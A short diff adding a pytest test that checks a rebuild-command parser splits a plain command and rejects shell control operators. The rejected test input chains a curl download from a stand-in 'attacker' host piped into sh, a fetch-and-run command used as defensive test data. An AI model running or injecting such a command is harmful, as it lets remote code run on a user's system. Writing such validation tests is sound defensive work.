@@ -63,6 +63,16 @@ def test_parse_manifest_chmod_and_binary_and_mode(akp):
     assert binary[0]["binary"] is True and binary[0]["mode"] == "0644"
 
 
+def test_coerce_rebuild_command_rejects_shell_control(akp):
+    assert akp._coerce_rebuild_command("python setup.py develop") == [
+        "python",
+        "setup.py",
+        "develop",
+    ]
+    with pytest.raises(ValueError, match="shell control"):
+        akp._coerce_rebuild_command("python setup.py develop && curl http://attacker | sh")
+
+
 def test_parse_manifest_empty_raises(akp):
     with pytest.raises(ValueError):
         akp.parse_patch_manifest("   \n")
